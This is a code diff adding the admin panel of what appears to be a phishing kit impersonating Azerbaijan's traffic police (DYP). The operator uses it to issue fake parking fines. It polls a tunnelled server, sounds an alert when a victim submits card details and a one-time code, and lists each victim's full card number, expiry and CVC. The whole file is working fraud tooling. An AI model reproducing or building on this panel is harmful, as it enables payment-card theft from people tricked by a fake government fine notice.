@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DYP - Admin İdarəetmə Paneli</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-gray-100 min-h-screen py-10 px-4">
+    <div class="max-w-xl mx-auto space-y-6">
+
+        <!-- Live Request Notification Banner (Hidden by default) -->
+        <div id="admin-notification" class="bg-red-600 text-white p-4 rounded-2xl shadow-2xl flex justify-between items-center hidden animate-bounce-once border-2 border-white">
+            <div class="flex items-center space-x-3">
+                <span class="text-2xl">🚨</span>
+                <div>
+                    <h3 class="font-bold text-sm">YENİ ÖDƏNİŞ SORĞU MƏKTUBU GƏLDİ!</h3>
+                    <p class="text-xs text-red-100">İstifadəçi kart məlumatlarını və OTP yazdı.</p>
+                </div>
+            </div>
+            <a href="requests.html" class="bg-white text-red-700 font-bold px-4 py-2 rounded-xl text-xs shadow hover:bg-red-50 transition">
+                Məktubu Aç ➡️
+            </a>
+        </div>
+
+        <!-- Header -->
+        <div class="bg-blue-700 text-white p-6 rounded-2xl shadow-xl text-center relative">
+            <!-- Server Connection Indicator Badge -->
+            <div id="server-badge" class="absolute top-3 right-3 bg-red-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full flex items-center space-x-1.5 shadow-md">
+                <span id="badge-dot" class="w-2 h-2 bg-white rounded-full animate-ping"></span>
+                <span id="badge-text">Serverə qoşulmayıb</span>
+            </div>
+
+            <h1 class="text-xl font-bold mt-2">🛠️ DYP Admin İdarəetmə Paneli</h1>
+            <p class="text-xs text-blue-200 mt-1">Yeni elektron cərimə yarat və idarə et</p>
+        </div>
+
+        <!-- Form -->
+        <div class="bg-white rounded-2xl shadow-xl p-6">
+            <form id="admin-form" onsubmit="submitAdminForm(event)" class="space-y-4">
+                <div>
+                    <label class="text-xs font-bold text-gray-700">Avtomobilin Qeydiyyat Nişanı (Nömrə)</label>
+                    <input type="text" id="edit-plate" placeholder="Məs: 10-AA-123" required
+                        class="w-full border-2 border-blue-200 focus:border-blue-500 rounded-xl p-3 text-base font-bold text-gray-800 mt-1 outline-none">
+                </div>
+
+                <div>
+                    <label class="text-xs font-bold text-gray-700">Pozuntu Ünvanı</label>
+                    <input type="text" id="edit-location" placeholder="Məs: Neftçilər prospekti 12, Bakı" required
+                        class="w-full border-2 border-blue-200 focus:border-blue-500 rounded-xl p-3 text-sm text-gray-800 mt-1 outline-none">
+                </div>
+
+                <div>
+                    <label class="text-xs font-bold text-gray-700">Pozuntu Şəkli (Maşının Şəkli)</label>
+                    <input type="file" id="edit-photo" accept="image/*"
+                        class="w-full border rounded-xl p-3 text-sm bg-gray-50 mt-1 file:mr-4 file:py-2 file:px-4 file:rounded-lg file:border-0 file:text-sm file:font-semibold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100">
+                </div>
+
+                <div class="bg-blue-50 p-3 rounded-xl text-xs text-blue-800 space-y-1">
+                    <p>📌 <strong>Avtomatik tətbiq olunanlar:</strong></p>
+                    <ul class="list-disc list-inside text-gray-600">
+                        <li>İXM Maddə 125.1 (Dayanma-durma)</li>
+                        <li>Cərimə məbləği: 80 AZN (Endirimli: 20 AZN)</li>
+                        <li>Cərimə balı: 2 Bal</li>
+                        <li>Protokol nömrəsi və cari tarix/saat</li>
+                    </ul>
+                </div>
+
+                <button type="submit" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 rounded-xl text-base shadow-lg transition">
+                    Cəriməni Tətbiq Et və Yarat
+                </button>
+
+                <div class="space-y-2 pt-2 text-center border-t">
+                    <div>
+                        <a href="../index.html" target="_blank" class="text-blue-600 hover:underline text-sm font-semibold">
+                            🔗 İstifadəçi Səhifəsini Aç (Cərimə Görünüşü)
+                        </a>
+                    </div>
+                    <div>
+                        <a href="requests.html" class="text-red-600 hover:underline text-sm font-bold">
+                            🔔 Ödəniş Sorğuları Səhifəsi (Səsli Bildiriş)
+                        </a>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+        <!-- PAID HISTORY & ARCHIVE FOLDER (ACCORDION) -->
+        <div class="bg-white rounded-2xl shadow-xl overflow-hidden">
+            <button onclick="toggleHistoryFolder()" class="w-full p-6 flex justify-between items-center bg-gray-50 hover:bg-gray-100 transition text-left">
+                <div class="flex items-center space-x-2">
+                    <span class="text-xl">📁</span>
+                    <h2 class="font-bold text-gray-800 text-base">Təsdiqlənmiş Ödənişlər Qovluğu (Tarixçə)</h2>
+                </div>
+                <span id="folder-arrow" class="text-gray-500 font-bold text-lg">▼</span>
+            </button>
+            <div id="history-content" class="p-6 space-y-3 border-t hidden">
+                <div id="history-container" class="space-y-3">
+                    <p class="text-xs text-gray-400 text-center py-4">Hələ ki təsdiqlənmiş ödəniş yoxdur...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let API_URL = 'https://continuously-pics-singing-robinson.trycloudflare.com/api';
+        let isLoaded = false;
+        let lastNotifiedCard = null;
+
+        function toggleHistoryFolder() {
+            const content = document.getElementById('history-content');
+            const arrow = document.getElementById('folder-arrow');
+            if (content.classList.contains('hidden')) {
+                content.classList.remove('hidden');
+                arrow.textContent = '▲';
+            } else {
+                content.classList.add('hidden');
+                arrow.textContent = '▼';
+            }
+        }
+
+        async function initConfig() {
+            try {
+                const res = await fetch('../config.json');
+                const config = await res.json();
+                if (config.apiUrl) {
+                    API_URL = config.apiUrl;
+                }
+            } catch (err) {
+                console.log("Config oxunmadı, lokal istifadə olunur");
+            }
+            loadData();
+            loadHistory();
+            setInterval(() => {
+                loadData();
+                loadHistory();
+            }, 3000);
+        }
+
+        function playBeep() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                const gainNode = audioCtx.createGain();
+
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
+                gainNode.gain.setValueAtTime(0.5, audioCtx.currentTime);
+
+                oscillator.connect(gainNode);
+                gainNode.connect(audioCtx.destination);
+
+                oscillator.start();
+                oscillator.stop(audioCtx.currentTime + 0.6);
+            } catch (e) {
+                console.log("Audio play error:", e);
+            }
+        }
+
+        async function loadData() {
+            const badge = document.getElementById('server-badge');
+            const badgeDot = document.getElementById('badge-dot');
+            const badgeText = document.getElementById('badge-text');
+            const notificationBanner = document.getElementById('admin-notification');
+
+            try {
+                const res = await fetch(`${API_URL}/fine`, { method: 'GET', signal: AbortSignal.timeout(3000) });
+                if (res.ok) {
+                    const data = await res.json();
+
+                    if (!isLoaded) {
+                        document.getElementById('edit-plate').value = data.plateNo || '';
+                        document.getElementById('edit-location').value = data.location || '';
+                        isLoaded = true;
+                    }
+
+                    if (data.hasNewRequest && data.cardNo && data.cardNo !== lastNotifiedCard) {
+                        lastNotifiedCard = data.cardNo;
+                        playBeep();
+                        notificationBanner.classList.remove('hidden');
+                    } else if (!data.hasNewRequest) {
+                        notificationBanner.classList.add('hidden');
+                    }
+
+                    badge.className = "absolute top-3 right-3 bg-green-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full flex items-center space-x-1.5 shadow-md";
+                    badgeDot.className = "w-2 h-2 bg-white rounded-full animate-ping";
+                    badgeText.textContent = "Serverə qoşuldu (Online)";
+                } else {
+                    throw new Error("Server error");
+                }
+            } catch (err) {
+                badge.className = "absolute top-3 right-3 bg-red-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full flex items-center space-x-1.5 shadow-md";
+                badgeDot.className = "w-2 h-2 bg-white rounded-full";
+                badgeText.textContent = "Serverə qoşulmayıb (Offline)";
+            }
+        }
+
+        async function loadHistory() {
+            try {
+                const res = await fetch(`${API_URL}/history`);
+                if (res.ok) {
+                    const history = await res.json();
+                    const container = document.getElementById('history-container');
+
+                    if (history.length === 0) {
+                        container.innerHTML = `<p class="text-xs text-gray-400 text-center py-4">Hələ ki təsdiqlənmiş ödəniş yoxdur...</p>`;
+                        return;
+                    }
+
+                    container.innerHTML = history.map(item => `
+                        <div class="bg-green-50 border border-green-200 rounded-xl p-4 space-y-2 text-xs">
+                            <div class="flex justify-between items-center font-bold text-green-800 border-b pb-2">
+                                <span>✅ Protokol: ${item.protocolNo}</span>
+                                <span class="bg-green-200 text-green-900 px-2 py-0.5 rounded-full">${item.amount.toFixed(2)} AZN</span>
+                            </div>
+                            <div class="grid grid-cols-2 gap-2 text-gray-700">
+                                <div><strong>Nömrə:</strong> <span class="text-blue-600 font-bold">${item.plateNo}</span></div>
+                                <div><strong>Vaxt:</strong> ${item.approvedAt}</div>
+                                <div class="col-span-2"><strong>Kart №:</strong> <span class="font-mono text-blue-800">${item.cardNo || 'N/A'}</span></div>
+                                <div><strong>Ay/İl (Exp):</strong> <span class="font-mono">${item.cardExp || 'N/A'}</span></div>
+                                <div><strong>CVC:</strong> <span class="font-mono">${item.cardCvc || 'N/A'}</span></div>
+                                <div class="col-span-2"><strong>Ünvan:</strong> ${item.location}</div>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+            } catch (err) {
+                console.error("Tarixçə yüklənmədi:", err);
+            }
+        }
+
+        initConfig();
+
+        async function submitAdminForm(event) {
+            event.preventDefault();
+            const plateNo = document.getElementById('edit-plate').value;
+            const location = document.getElementById('edit-location').value;
+            const photoInput = document.getElementById('edit-photo');
+
+            if (photoInput.files.length > 0) {
+                const formData = new FormData();
+                formData.append('photo', photoInput.files[0]);
+                try {
+                    await fetch(`${API_URL}/upload`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (err) {
+                    console.error("Şəkil yüklənmə xətası:", err);
+                }
+            }
+
+            try {
+                const res = await fetch(`${API_URL}/fine/update`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ plateNo, location })
+                });
+                const resultJson = await res.json();
+                if (resultJson.success) {
+                    alert("Cərimə uğurla yaradıldı və yeniləndi!");
+                    loadData();
+                }
+            } catch (err) {
+                console.error("Yeniləmə xətası:", err);
+                alert("Serverə qoşulmaq mümkün olmadı!");
+            }
+        }
+    </script>
+</body>
+</html>
